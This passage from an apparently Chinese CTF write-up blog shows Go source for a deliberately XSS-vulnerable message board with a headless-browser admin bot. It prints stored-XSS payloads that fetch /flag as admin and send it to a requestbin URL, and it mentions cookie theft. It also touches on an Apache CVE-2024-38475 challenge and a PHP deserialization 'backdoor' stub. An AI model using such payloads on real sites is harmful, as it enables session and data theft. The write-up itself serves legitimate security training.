class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>log<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Login failed for user: %s\n"</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusUnauthorized<span class="token punctuation">,</span> <span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">logoutHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>session<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> store<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> <span class="token string">"session"</span><span class="token punctuation">)</span><span class="token function">delete</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>Values<span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> c<span class="token punctuation">.</span>Writer<span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusFound<span class="token punctuation">,</span> <span class="token string">"/login"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">indexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>session<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> store<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> <span class="token string">"session"</span><span class="token punctuation">)</span>username<span class="token punctuation">,</span> ok <span class="token operator">:=</span> session<span class="token punctuation">.</span>Values<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"User not logged in, redirecting to login"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusFound<span class="token punctuation">,</span> <span class="token string">"/login"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">if</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>Method <span class="token operator">==</span> http<span class="token punctuation">.</span>MethodPost <span class="token punctuation">{</span>comment <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span><span class="token string">"comment"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"New comment submitted: %s\n"</span><span class="token punctuation">,</span> comment<span class="token punctuation">)</span>comments <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>comments<span class="token punctuation">,</span> comment<span class="token punctuation">)</span><span class="token punctuation">}</span>htmlContent <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">`&lt;html&gt;&lt;body&gt;&lt;h1&gt;留言板&lt;/h1&gt;&lt;p&gt;欢迎，%s，试着写点有意思的东西吧，admin才不会来看你！自恋的笨蛋！&lt;/p&gt;&lt;form method="post"&gt;&lt;textarea name="comment" required&gt;&lt;/textarea&gt;&lt;br&gt;&lt;input type="submit" value="提交评论"&gt;&lt;/form&gt;&lt;h3&gt;留言:&lt;/h3&gt;&lt;ul&gt;`</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> comment <span class="token operator">:=</span> <span class="token keyword">range</span> comments <span class="token punctuation">{</span>htmlContent <span class="token operator">+=</span> <span class="token string">"&lt;li&gt;"</span> <span class="token operator">+</span> comment <span class="token operator">+</span> <span class="token string">"&lt;/li&gt;"</span><span class="token punctuation">}</span>htmlContent <span class="token operator">+=</span> <span class="token string">`&lt;/ul&gt;&lt;p&gt;&lt;a href="/logout"&gt;退出&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;`</span>c<span class="token punctuation">.</span><span class="token function">Data</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> <span class="token string">"text/html; charset=utf-8"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>htmlContent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">adminHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//c *gin.Context 是 Gin 框架中非常重要的一个参数，它代表了当前 HTTP 请求的上下文。通过 c 可以访问请求的各种信息（如请求头、请求参数等），也可以设置和发送响应信息。</span>htmlContent <span class="token operator">:=</span> <span class="token string">`&lt;html&gt;&lt;body&gt;&lt;p&gt;好吧好吧你都这么求我了~admin只好勉为其难的来看看你写了什么~才不是人家想看呢！&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;`</span>c<span class="token punctuation">.</span><span class="token function">Data</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> <span class="token string">"text/html; charset=utf-8"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>htmlContent<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">//c.Data 是 gin.Context 对象的一个方法，用于发送二进制数据作为 HTTP 响应。</span><span class="token comment">//无头浏览器模拟登录admin，并以admin身份访问/路由</span>    <span class="token comment">//http.StatusOK 是 HTTP 响应状态码，表示请求成功（状态码为 200）。</span><span class="token comment">//"text/html; charset=utf-8" 是响应内容的 MIME 类型和字符编码，表明响应内容是 HTML 格式，使用 UTF - 8 编码。</span><span class="token comment">//[]byte(htmlContent) 将字符串 htmlContent 转换为字节切片，因为 Data 方法要求传入的 data 参数是字节切片类型。</span><span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//Goroutine 是 Go 语言并发编程的核心概念之一，它是一种轻量级的线程实现，由 Go 运行时（runtime）进行管理。与传统的操作系统线程相比，goroutine 的开销非常小，启动和销毁的速度更快，并且可以在单个操作系统线程上多路复用，因此可以轻松创建成千上万个 goroutine，实现高效的并发编程。</span>lock<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">defer</span> lock<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//加锁和解锁操作，确保在并发环境下对共享资源的安全访问。</span>ctx<span class="token punctuation">,</span> cancel <span class="token operator">:=</span> chromedp<span class="token punctuation">.</span><span class="token function">NewContext</span><span class="token punctuation">(</span>context<span class="token punctuation">.</span><span class="token function">Background</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//创建一个新的 chromedp 上下文</span><span class="token keyword">defer</span> <span class="token function">cancel</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ctx<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">WithTimeout</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token number">20</span><span class="token operator">*</span>time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span><span class="token comment">//设置上下文的超时时间为 20 秒。</span><span class="token keyword">if</span> err <span class="token operator">:=</span> chromedp<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token function">myTasks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Chromedp error:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// 无头浏览器操作</span><span class="token comment">//Chromedp：是一个用于 Go 语言的无头浏览器自动化库，基于 Chrome DevTools Protocol，提供了简单易用的 API，可用于控制 Chrome 或 Chromium 浏览器进行网页自动化操作。</span><span class="token keyword">func</span> <span class="token function">myTasks</span><span class="token punctuation">(</span><span class="token punctuation">)</span> chromedp<span class="token punctuation">.</span>Tasks <span class="token punctuation">{</span><span class="token keyword">return</span> chromedp<span class="token punctuation">.</span>Tasks<span class="token punctuation">{</span><span class="token comment">//函数返回一个 chromedp.Tasks 类型的值，chromedp.Tasks 实际上是一个 []chromedp.Action 切片，用于存储一系列的浏览器操作任务。</span>chromedp<span class="token punctuation">.</span><span class="token function">Navigate</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//chromedp.Navigate 是 chromedp 库提供的一个操作，用于让浏览器导航到指定的 URL。</span>chromedp<span class="token punctuation">.</span><span class="token function">WaitVisible</span><span class="token punctuation">(</span><span class="token string">`input[name="username"]`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>chromedp<span class="token punctuation">.</span><span class="token function">SendKeys</span><span class="token punctuation">(</span><span class="token string">`input[name="username"]`</span><span class="token punctuation">,</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>chromedp<span class="token punctuation">.</span><span class="token function">SendKeys</span><span class="token punctuation">(</span><span class="token string">`input[name="password"]`</span><span class="token punctuation">,</span> <span class="token string">"fake_password"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>chromedp<span class="token punctuation">.</span><span class="token function">Click</span><span class="token punctuation">(</span><span class="token string">`input[type="submit"]`</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//真无敌了这傲娇admin</span>chromedp<span class="token punctuation">.</span><span class="token function">Navigate</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//登录成功后，使用 chromedp.Navigate 操作让浏览器导航到根路径 /，即主页。</span>chromedp<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">flagHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Handling flag request"</span><span class="token punctuation">)</span>session<span class="token punctuation">,</span> err <span class="token operator">:=</span> store<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> <span class="token string">"session"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> <span class="token string">"无法获取会话"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>username<span class="token punctuation">,</span> ok <span class="token operator">:=</span> session<span class="token punctuation">.</span>Values<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token operator">||</span> username <span class="token operator">!=</span> <span class="token string">"admin"</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">,</span> <span class="token string">"只有admin才可以访问哦"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Admin accessed the flag"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> loginHandler<span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> loginHandler<span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">,</span> logoutHandler<span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> indexHandler<span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> adminHandler<span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> flagHandler<span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Server started at :8888"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":8888"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//而且（容器内端口为8888）</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/cdb0f52e2855b6acf0d6f5641f51aaf8.png"></p><p>admin密码不行</p><p><code>《script&gt;alert(1)&lt;/script&gt;</code>存在xss漏洞</p><p>当访问/admin的时候，会触发一个后台的goroutine，用无头浏览器模拟admin登录，并访问首页。</p><p>攻击者提交一个带有恶意JavaScript代码的评论，当admin用户被触发访问首页时，这段代码会在admin的上下文中执行，从而可以获取到admin的cookie或者直接访问/flag端点，然后将结果发送到攻击者的服务器。</p><p>根路径的indexHandler会渲染所有评论。如果攻击者的评论被存储在comments数组中，那么管理员访问首页时自然会加载这些评论，触发XSS。</p><p><a href="https://www.runoob.com/ajax/fetch-api.html">Fetch API | 菜鸟教程</a></p><blockquote><p>fetch 的语法相当简洁，最基本的形式是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 解析 JSON 数据</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment">// 处理数据</span>  <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 错误处理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><ol><li><p><strong>提交评论</strong><br>向留言板提交包含脚本的评论：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">《script<span class="token operator">&gt;</span>  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//response.text() 方法会读取响应体的内容并将其作为一个新的 Promise 对象返回，这个新的 Promise 最终会解析为一个字符串，即响应体的文本内容。</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">flag</span> <span class="token operator">=&gt;</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://xxx'</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//这是第二个 .then 方法，用于处理 response.text() 返回的 Promise 成功时的回调。当 response.text() 成功读取到响应体的文本内容后，会将其作为参数（命名为 flag）传递给这个回调函数。</span><span class="token comment">//encodeURIComponent(flag) 是 JavaScript 的内置函数，用于对 flag 字符串进行编码，确保其中的特殊字符（如空格、问号等）能够被正确地作为 URL 参数传递。</span><span class="token comment">//向服务器发起一个 GET 请求，将编码后的 flag 作为参数附加到 URL 后面。</span>《<span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>触发管理员访问</strong><br>访问 <code>/admin</code> 端点，触发无头浏览器执行以下操作：</p><ul><li>以 <code>admin</code> 身份登录（携带正确密码）。</li><li>访问首页 <code>/</code>，加载所有评论。</li></ul></li><li><p><strong>XSS 触发与 Flag 窃取</strong></p><ul><li><p>无头浏览器加载首页时，脚本被执行。</p></li><li><p>脚本以 <code>admin</code> 身份发起对 <code>/flag</code> 的请求，获取到 Flag。</p></li><li><p>将 Flag 外带到服务器（<code>http://xxx</code>）。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">《script<span class="token operator">&gt;</span>  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=&gt;</span> r<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">flag</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://requestbin.cn:80/zn6yxqzn?flag='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>《<span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/790ba4651d32bb5c1417e1f51a56078e.png"></p><p>或者</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">《script<span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">flag</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> form <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//FormData 是 JavaScript 的内置对象，用于创建表单数据。</span>    form<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'comment'</span><span class="token punctuation">,</span> <span class="token string">'FLAG: '</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//form.append 方法用于向 FormData 对象中添加键值对。'comment' 是键，'FLAG: ' + flag 是值，即将获取到的 flag 信息添加到 comment 字段中，并在前面加上 FLAG: 前缀。</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token literal-property property">body</span><span class="token operator">:</span> form <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//{ method: 'POST', body: form } 是请求的配置对象。method: 'POST' 表示使用 POST 方法发送请求，body: form 表示将之前创建的 FormData 对象作为请求体发送。这样，包含 flag 信息的表单数据就会被发送到目标网站的根路径。</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>《<span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/66f02c6d4bb88109a89e41bd30c835a7.png"></p><p>其实一样（</p><p>当然用xss盗了cookie再登admin也行</p></li></ul></li></ol><hr><h3 id="Level-38475-角落"><a href="#Level-38475-角落" class="headerlink" title="Level 38475 角落"></a>Level 38475 角落</h3><pre class="line-numbers language-none"><code class="language-none">User-agent: *Disallow: /app.confDisallow: /app/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Include by httpd.conf</span><span class="token operator">&lt;</span>Directory <span class="token string">"/usr/local/apache2/app"</span><span class="token operator">&gt;</span>Options IndexesAllowOverride <span class="token boolean">None</span>Require <span class="token builtin">all</span> granted<span class="token operator">&lt;</span><span class="token operator">/</span>Directory<span class="token operator">&gt;</span><span class="token operator">&lt;</span>Files <span class="token string">"/usr/local/apache2/app/app.py"</span><span class="token operator">&gt;</span>    Order Allow<span class="token punctuation">,</span>Deny    Deny <span class="token keyword">from</span> <span class="token builtin">all</span><span class="token operator">&lt;</span><span class="token operator">/</span>Files<span class="token operator">&gt;</span>RewriteEngine OnRewriteCond <span class="token string">"%{HTTP_USER_AGENT}"</span> <span class="token string">"^L1nk/"</span>RewriteRule <span class="token string">"^/admin/(.*)$"</span> <span class="token string">"/$1.html?secret=todo"</span>ProxyPass <span class="token string">"/app/"</span> <span class="token string">"http://127.0.0.1:5000/"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.hnitns.com/index.php?id=255">关于Apache HTTP Server mod_rewrite输出不当逃逸漏洞 (CVE-2024-38475) - 安全通告 - 安全研究 - 湖南中测网安信息技术有限公司</a></p><p>无敌了</p><p><a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/">(繁中) Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! | Orange Tsai</a></p><p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20250217222622618.png" alt="image-20250217222622618"></p><p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20250217222704583.png" alt="image-20250217222704583"></p><p>然后用条件竞争什么的。。。。有空再看吧</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>其他题3（队）</title>
      <link href="/2025/02/19/2.12/"/>
      <url>/2025/02/19/2.12/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ef05533ef705c93811edafeb744016b9.png"></p><h3 id="DASCTF-X-GFCTF-2024｜四月开启第一局-web1234"><a href="#DASCTF-X-GFCTF-2024｜四月开启第一局-web1234" class="headerlink" title="[DASCTF X GFCTF 2024｜四月开启第一局]web1234"></a>[DASCTF X GFCTF 2024｜四月开启第一局]web1234</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/19e5725fb352b0e4f8520832b502c1a3.png"></p><p>base64+unserialize+md5</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">PHP_Incomplete_Class <span class="token keyword type-declaration">Object</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span>__PHP_Incomplete_Class_Name<span class="token punctuation">]</span> <span class="token operator">=&gt;</span> Config    <span class="token punctuation">[</span>uname<span class="token punctuation">]</span> <span class="token operator">=&gt;</span> admin    <span class="token punctuation">[</span>passwd<span class="token punctuation">]</span> <span class="token operator">=&gt;</span> <span class="token number">50</span>b9748289910436bfdd34bda7b1c9d9<span class="token operator">=&gt;</span><span class="token number">1</span>q2w3e    <span class="token punctuation">[</span>avatar<span class="token punctuation">]</span> <span class="token operator">=&gt;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span><span class="token number">1.</span>png    <span class="token punctuation">[</span>nickname<span class="token punctuation">]</span> <span class="token operator">=&gt;</span> 小熊软糖OvO    <span class="token punctuation">[</span>sex<span class="token punctuation">]</span> <span class="token operator">=&gt;</span> 女    <span class="token punctuation">[</span>mail<span class="token punctuation">]</span> <span class="token operator">=&gt;</span> admin@admin<span class="token operator">.</span>com    <span class="token punctuation">[</span>telnum<span class="token punctuation">]</span> <span class="token operator">=&gt;</span> <span class="token number">12345678901</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我觉得荔枝味的软糖天下第一！！！尤其是夹心那种的！！！</p><p>这图片。。。<del>有点吓人（</del></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'backdoor'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'backdoor'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>           <span class="token variable">$func</span><span class="token 